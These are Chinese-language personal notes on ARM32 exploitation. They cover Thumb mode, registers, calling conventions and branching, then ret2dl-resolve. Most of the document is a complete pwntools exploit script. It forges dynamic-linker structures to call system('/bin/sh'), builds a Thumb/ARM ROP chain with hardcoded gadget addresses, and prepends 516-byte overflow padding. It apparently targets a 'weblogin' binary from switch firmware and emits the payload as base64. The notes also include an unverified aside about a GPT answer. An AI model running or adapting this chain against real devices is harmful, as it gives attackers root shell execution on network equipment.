### 交叉编译

### 工具

### 概念

#### Thumb 指令

ARM 处理器有两种主要运行模式：

- **ARM 模式**：指令长度固定为 32 位（4 字节）。
- **Thumb 模式**：指令长度通常为 16 位（2 字节），效率更高，内存占用更小。

Thumb指令更短，一般来说可用的Gadget更多，通过如下命令搜索Thumb指令

```shell
ROPgadget --binary libc-2.21.so --thumb
```

ARM 处理器的程序状态寄存器（CPSR）中有一个 **T 位（Thumb bit）**。

- 如果 T=0，CPU 认为下一条指令是 32 位的 ARM 指令。
- 如果 T=1，CPU 认为下一条指令是 16 位的 Thumb 指令

`BLX r5` r5的值是`0x00003738 + 1`，这里的+1就表示T=1

### 汇编

#### 寄存器

| 寄存器     | 别名                                         | 用途说明                                                  |
| ---------- | -------------------------------------------- | --------------------------------------------------------- |
| `R0`–`R3`  | 无                                           | 用于函数调用时传递参数（前 4 个参数）或返回值（R0）       |
| `R4`–`R11` | 无                                           | 被称为 "callee-saved"，函数调用时通常要保存和恢复的寄存器 |
| `R12`      | `IP` (Intra-Procedure-call scratch register) | 中间过程使用的临时寄存器                                  |
| `R13`      | `SP` (Stack Pointer)                         | 指向当前栈顶                                              |
| `R14`      | `LR` (Link Register)                         | 保存函数调用返回地址                                      |
| `R15`      | `PC` (Program Counter)                       | 当前正在执行的指令地址                                    |

#### 指令

| 指令                     | 含义                                        |
| ------------------------ | ------------------------------------------- |
| `PUSH {R11, LR}`         | 保存 R11 和返回地址 LR 到栈中（函数调用前） |
| `POP {R11, PC}`          | 恢复 R11 和程序计数器（返回到调用者）       |
| `ADD Rn, Rm, #imm`       | Rn ← Rm + imm，立即数加法                   |
| `SUB Rn, Rm, #imm`       | Rn ← Rm - imm，立即数减法                   |
| `MOV Rd, Rm/#imm`        | 把寄存器或立即数复制到目的寄存器            |
| `STR Rd, [Rn, #offset]`  | 把 Rd 的值存到 Rn + offset 地址上（word）   |
| `LDR Rd, [Rn, #offset]`  | 从地址 Rn + offset 读取 word 到 Rd          |
| `STRB Rd, [Rn, #offset]` | 存储一个字节到地址 Rn + offset              |
| `LDRB Rd, [Rn, #offset]` | 读取一个字节从地址 Rn + offset 到 Rd        |
| `CMP Rn, #imm`           | 比较 Rn 和立即数，设置标志（Z/N）           |
| `BNE/BGT/BEQ/B`          | 条件跳转：不等于/大于/等于/无条件跳转       |
| `BL func`                | 调用函数（并保存返回地址到 LR）             |
| `UXTB Rd, Rm`            | 扩展低字节为无符号到 32-bit                 |
| `EOR Rd, Rm, #imm`       | 按位异或                                    |
| `LSR Rd, Rm, #imm`       | 逻辑右移                                    |
| `MOV R0, Rn`             | 通常用于设置函数参数                        |

#### 函数调用和参数传递

| 参数编号  | 使用寄存器 |
| --------- | ---------- |
| 第1个参数 | R0         |
| 第2个参数 | R1         |
| 第3个参数 | R2         |
| 第4个参数 | R3         |

超过 4 个参数的，其余参数会**从右到左**依次压栈

参数按 **word 对齐**（4 字节对齐）

1. 返回值放在 `R0` 中（基本类型）

- `int`, `char`, `pointer` 等类型直接用 `R0`
- `long long`、`double` 用 `R0:R1` 组成 64 位

2. 返回结构体（大小 ≤ 4 个字）的方式：

- 如果结构体大小 ≤ 4 字节，可以直接用 `R0` 返回
- 如果结构体大小 > 4 字节，则**调用者提供缓冲区地址**，传递给 callee 的第一个参数，callee 写入该结构体

#### 跳转指令

```assembly
# PC = target,LR = 下一条指令地址，不支持ARM / Thumb切换；类似于call
BL sub_1234

# PC = target,LR = 下一条指令地址，支持ARM / Thumb切换
# BLX支持 BLX 立即数; 和BLX 寄存器; 两种形式
BLX target

# 只跳转 不保存返回地址 不切换状态
B Rm

# 跳转到 Rm；根据 bit0 切换 ARM/Thumb；不保存 LR
BX Rm

# 从栈中加载 PC；根据 PC bit0 切换 ARM/Thumb
POP {R0, R1, PC}

# 和 pop {..., pc} 本质相同；ARM 状态常见
LDMIA SP!, {R4, R5, PC}

# 不会切换状态
MOV PC, R3

# 从内存加载 PC；根据 bit0 切换状态
LDR PC, [SP, #0x10]
```

### 栈溢出

#### ret2dl-resolve

* 调用流程

```assembly
=> 0x10f54 <printf@plt>:        add     r12, pc, #0, 12

   0x10f58 <printf@plt+4>:      add     r12, r12, #69632        ; 0x11000

   0x10f5c <printf@plt+8>:      ldr     pc, [r12, #192]!        ; 0xc0



; rop直接跳转到此处，要设置r0为system的参数
; 这里的lr会影响到返回地址，但是不会影响后续的代码逻辑
; r12的值也要设置，作为生产reloc_arg的因子
=> 0x10f10:     push    {lr}            ; (str lr, [sp, #-4]!)

   0x10f14:     ldr     lr, [pc, #4]    ; 0x10f20

   0x10f18:     add     lr, pc, lr

   0x10f1c:     ldr     pc, [lr, #8]!



=> 0xf7fd511c <_dl_runtime_resolve>:    push    {r0, r1, r2, r3, r4}

   0xf7fd5120 <_dl_runtime_resolve+4>:  ldr     r0, [lr, #-4]

   0xf7fd5124 <_dl_runtime_resolve+8>:  sub     r1, r12, lr

   0xf7fd5128 <_dl_runtime_resolve+12>: sub     r1, r1, #4

   0xf7fd512c <_dl_runtime_resolve+16>: add     r1, r1, r1

   0xf7fd5130 <_dl_runtime_resolve+20>: blx     0xf7fd1058 <_dl_fixup>

   0xf7fd5134 <_dl_runtime_resolve+24>: mov     r12, r0

   0xf7fd5138 <_dl_runtime_resolve+28>: pop     {r0, r1, r2, r3, r4, lr}

   0xf7fd513c <_dl_runtime_resolve+32>: bx      r12
```

```python
from pwn import *
def get_resolve_addrs(binary_path):
    """
    自动从 ELF 文件中提取 ARM32 ret2dl-resolve 所需的关键地址
    """
    # 加载 ELF 文件 (关闭无关的警告输出，保持终端整洁)
    context.log_level = 'error'
    elf = ELF(binary_path)
    context.log_level = 'info'
    log.info(f"正在解析二进制文件: {binary_path}")
    # 1. 寻找安全的 BSS 段地址 (bss_target_addr)
    # 我们不在 bss 的绝对开头写，加上 0x100 的偏移，是为了防止覆盖程序本身在 bss 段存放的重要全局变量
    bss_target_addr = elf.bss() + 0x100
    log.success(f"bss_target_addr : {hex(bss_target_addr)}")
    # 2. 提取 .rel.plt 地址 (重定位表)
    # 这是动态链接器查找 Elf32_Rel 结构体的基址
    rel_plt_addr = elf.get_section_by_name('.rel.plt').header.sh_addr
    log.success(f"rel_plt_addr : {hex(rel_plt_addr)}")
    # 3. 提取 .dynsym 地址 (动态符号表)
    # 这是动态链接器查找 Elf32_Sym 结构体的基址
    dynsym_addr = elf.get_section_by_name('.dynsym').header.sh_addr
    log.success(f"dynsym_addr : {hex(dynsym_addr)}")
    # 4. 提取 .dynstr 地址 (动态字符串表)
    # 这是动态链接器比对字符串 (如 "system") 的基址
    dynstr_addr = elf.get_section_by_name('.dynstr').header.sh_addr
    log.success(f"dynstr_addr : {hex(dynstr_addr)}")
    # 5. 计算 GOT[2] 的地址 (got2_addr)
    # .got.plt 段的前三项有特殊含义:
    # GOT[0] = .dynamic 段地址
    # GOT[1] = link_map 指针
    # GOT[2] = _dl_runtime_resolve 函数指针
    # 每个表项占 4 字节，所以 GOT[2] 就是 .got.plt 基址 + 8
    # arm32有时会将 .got.plt与got合并，单独取不到
    gotplt_base = elf.get_section_by_name('.got').header.sh_addr
    # relplt = elf.get_section_by_name('.rel.plt')
    # relplt_data = relplt.data()
    # first_rel = u32(relplt_data[0:4])
    # gotplt_base = first_rel
    got2_addr = gotplt_base + 8
    log.success(f"got2_addr : {hex(got2_addr)}")
    # .plt[0]
    plt0 = elf.get_section_by_name('.plt').header.sh_addr
    log.success(f"plt0_addr : {hex(plt0)}")
    return bss_target_addr, rel_plt_addr, dynsym_addr, dynstr_addr, got2_addr, plt0
# libc
def generate_ret2dl_payload(bss_target_addr, rel_plt_addr, dynsym_addr, dynstr_addr, got2_addr, command="/bin/sh"):
    """
        生成 ARM32 ret2dl-resolve 伪造数据结构及 r12 寄存器的值
        参数:
        bss_target_addr : 你选择写入伪造数据的起点的可写地址 (如 .bss 段某处)
        rel_plt_addr : 二进制文件 .rel.plt 节的起始地址 (JMPREL)
        dynsym_addr : 二进制文件 .dynsym 节的起始地址 (SYMTAB)
        dynstr_addr : 二进制文件 .dynstr 节的起始地址 (STRTAB)
        got2_addr : GOT[2] 的地址 (动态解析时 lr 寄存器指向的值)
        返回:
        payload : 需要写入 bss_target_addr 的字节流
        r12_val : 需要布置到 r12 寄存器的魔法值
        binsh_addr : "/bin/sh" 字符串在内存中的最终绝对地址 (用来给 r0 传参)
        """
    # 1. 强制 Elf32_Sym 16字节对齐
    sym_addr = bss_target_addr
    while (sym_addr - dynsym_addr) % 16 != 0:
        sym_addr += 4
    padding_len = sym_addr - bss_target_addr
    padding = b"A" * padding_len
    # 2. 重新规划内存布局 (把变长字符串放最后)
    rel_addr = sym_addr + 0x10 # Elf32_Sym 占 16 (0x10) 字节
    str_system_addr = rel_addr + 0x8 # Elf32_Rel 占 8 字节
    fake_got_addr = str_system_addr + 0x8 # "system\x00\x00" 对齐占 8 字节
    cmd_addr = fake_got_addr + 0x4 # fake_got 占 4 字节
    # ------------------------------------------------
    # 构造 Elf32_Sym
    # ------------------------------------------------
    st_name = str_system_addr - dynstr_addr
    st_value = 0
    st_size = 0
    st_info = 0x12 # STB_GLOBAL | STT_FUNC
    st_other = 0
    st_shndx = 0
    fake_sym = p32(st_name) + p32(st_value) + p32(st_size) + p8(st_info) + p8(st_other) + p16(st_shndx)
    # ------------------------------------------------
    # 构造 Elf32_Rel
    # ------------------------------------------------
    sym_idx = (sym_addr - dynsym_addr) // 16
    print("sym_idx:"+str(sym_idx))
    R_ARM_JUMP_SLOT = 22
    r_offset = fake_got_addr
    r_info = (sym_idx << 8) | R_ARM_JUMP_SLOT
    fake_rel = p32(r_offset) + p32(r_info)
    # ------------------------------------------------
    # 构造字符串与占位符
    # ------------------------------------------------
    str_system = b"system\x00\x00"
    fake_got_space = p32(0xdeadbeef)
    # 处理任意命令参数
    if isinstance(command, str):
        command = command.encode()
    if not command.endswith(b'\x00'):
        command += b'\x00' # 确保 C 语言字符串以 \x00 截断
    # 组装最终写入内存的 payload
    payload = padding + fake_sym + fake_rel + str_system + fake_got_space + command
    # ------------------------------------------------
    # 计算核心的 r12 魔法值
    # ------------------------------------------------
    reloc_arg = rel_addr - rel_plt_addr
    r12_val = (reloc_arg // 2) + got2_addr + 4
    # r12_val = reloc_arg
    print(f"[*] 伪造数据结构起点: {hex(bss_target_addr)}")
    print(f"[*] r12 寄存器应赋值: {hex(r12_val)}")
    print(f"[*] r0 (命令参数) 应指向: {hex(cmd_addr)}")
    print(f"[*] 当前命令内容: {command}")
    return payload, r12_val, cmd_addr
def build_refined_exp(bss_addr, payload, r12_val, cmd_addr, plt0=0x10f10):
    # --- Gadgets ---
    # Thumb 模式 Gadgets (地址末位 +1)
    thumb_pop_r2_pc = 0x116fa + 1 # pop {r2, pc}
    thumb_pop_r3_r5 = 0x116fc + 1 # pop {r3, r4, r5, pc}
    thumb_write = 0x11882 + 1 # strh r2, [r7, #0xc] ; strb r3, [r7, #0xe] ; pop {r4, r5, r6, r7, pc}
    thumb_mov_r0_r6 = 0x117b6 + 1 # mov r0, r6 ; pop {r3, r4, r5, r6, r7, pc}
    # ARM 模式 Gadget (地址保持偶数)
    arm_pop_final = 0x118cc # pop {r1, r2, r4, r5, r6, r7, r8, ip, lr, pc}
    rop = b""
    rop+=p32(thumb_pop_r2_pc)
    log.info(f"构建精简搬砖链，首个目标 r7: {hex(bss_addr - 0xc)}")
    # --- 步骤 1：搬砖循环 (每块 3 字节) ---
    for i in range(0, len(payload), 3):
        chunk = payload[i:i + 3].ljust(3, b'\x00')
        r2_val = u16(chunk[0:2])
        r3_val = chunk[2]
        # 1. 消耗 pop {r2, pc}
        # (此时 pc 刚跳入 0x116fb，开始吃栈上的数据)
        rop += p32(r2_val) # -> 弹入 r2
        rop += p32(thumb_pop_r3_r5) # -> 弹入 pc (关键修复！接力跳向下一条 pop)
        # 2. 消耗 pop {r3, r4, r5, pc}
        # (此时 pc 刚跳入 0x116fd)
        rop += p32(r3_val) # -> 弹入 r3
        rop += p32(0) # -> 弹入 r4
        rop += p32(0) # -> 弹入 r5
        rop += p32(thumb_write) # -> 弹入 pc (关键修复！接力跳向 str 写入指令)
        # 3. 消耗 write gadget 结尾的 pop {r4, r5, r6, r7, pc}
        # (此时执行完了写入，开始处理结尾的 pop)
        rop += p32(0) # -> 弹入 r4
        rop += p32(0) # -> 弹入 r5
        rop += p32(0) # -> 弹入 r6
        if i + 3 >= len(payload):
            # 最后一轮：不需要再设置 next_r7，准备跳出循环进入 ARM 模式
            rop += p32(0) # -> 弹入 r7 (随意值)
            rop += p32(arm_pop_final) # -> 弹入 pc (偶数地址，触发 Thumb -> ARM 切换)
        else:
            # 常规轮：计算下一轮的 r7 目标地址，并跳回循环开头
            next_r7 = bss_addr + i + 3 - 0xc
            rop += p32(next_r7) # -> 弹入 r7 (为下一轮准备)
            rop += p32(thumb_pop_r2_pc) # -> 弹入 pc (回到 0x116fb 继续搬砖)
    # --- 步骤 2：ARM 模式控制 r12 ---
    # (此时 pc 已跳入 0x118cc，处于 ARM 模式)
    rop += p32(0) # -> r1
    rop += p32(0) # -> r2
    rop += p32(0) # -> r4
    rop += p32(0) # -> r5
    rop += p32(cmd_addr) # -> r6 (准备传给 r0)
    rop += p32(0) # -> r7
    rop += p32(0) # -> r8
    rop += p32(r12_val) # -> ip (r12 核心魔法值)
    rop += p32(0) # -> lr (可以填 0，如果不打算 return 的话)
    # 消耗 pc，切回 Thumb 模式以执行 mov r0, r6
    rop += p32(thumb_mov_r0_r6)
    # --- 步骤 3：传参并进入解析 ---
    # (此时 pc 已跳入 0x117b6)
    # 消耗 thumb_mov_r0_r6 结尾的 pop {r3, r4, r5, r6, r7, pc}
    rop += p32(0) * 5 # -> r3, r4, r5, r6, r7
    rop += p32(plt0) # -> pc (偶数地址，切回 ARM 模式进入 PLT0)
    return rop
def build_fake_link_map(symtab_addr, strtab_addr, scope_addr=0, base_addr=0):
    """
    build minimal fake link_map for ARM ret2dlresolve
    parameters
    ----------
    symtab_addr : fake dynsym table address
    strtab_addr : fake dynstr table address
    scope_addr : lookup scope pointer
    base_addr : l_addr
    """
    payload = fit({
        # l_addr
        0x0: p32(base_addr),
        # l_info[DT_SYMTAB]
        0x34: p32(symtab_addr),
        # l_info[DT_STRTAB]
        0x38: p32(strtab_addr),
        # l_info[DT_VERSYM] = NULL
        0xe8: p32(0),
        # lookup scope
        0x1d0: p32(scope_addr),
    }, filler=b'\x00', length=0x400)
    return payload
elf_path = r'C:\Users\daoli-01\Desktop\py\S5800-24X2C\usr\bin\weblogin' # 替换为你的二进制文件路径
bss_addr, rel_plt, dynsym, dynstr, got2,plt0 = get_resolve_addrs(elf_path)
payload, r12_val, cmd_addr=generate_ret2dl_payload(bss_addr, rel_plt, dynsym, dynstr, got2, command="/bin/sh")
# payload, r12_val, cmd_addr=generate_ret2dl_payload(bss_addr, rel_plt, dynsym, dynstr, command="touch /tmp/pwn123")
# 生成最终的二进制 ROP 链
final_rop = build_refined_exp(bss_addr, payload, r12_val, cmd_addr, plt0)
r4=p32(0)
r5=p32(0)
r6=p32(0)
r7=p32(bss_addr - 0xc)
r8=p32(0)
r9=p32(0)
r10=p32(0)
r11=p32(0)
final_payload = b'a'*516+r4+r5+r6+r7+r8+r9+r10+r11+final_rop
b64_str = base64.b64encode(final_payload).decode('ascii')
print(b64_str)
```



##### .gnu.version版本检查

* `reloc->r_info -> symidx -> .gnu.version[ symidx ] -> l_versions[ndx] -> _dl_lookup_symbol_x`
* .gnu.version[ symidx ]的起始地址

```shell
readelf -S ./target | grep '\.gnu.version'
readelf -d ./target | grep VERSYM
```

* .gnu.version[ symidx ]如果访问非法内存，会造成无法利用；如果.gnu.version[ symidx ]访问的数据不为0，后续版本检查会影响ret2dl_resolve的利用
* 可以通过调整Elf32_Sym的位置，即symidx 的值，来调整.gnu.version[ symidx ]的访问结果

##### 不知道libc基址的情况下伪造link_map的可行性

* GPT回答不可行，但是没有验证
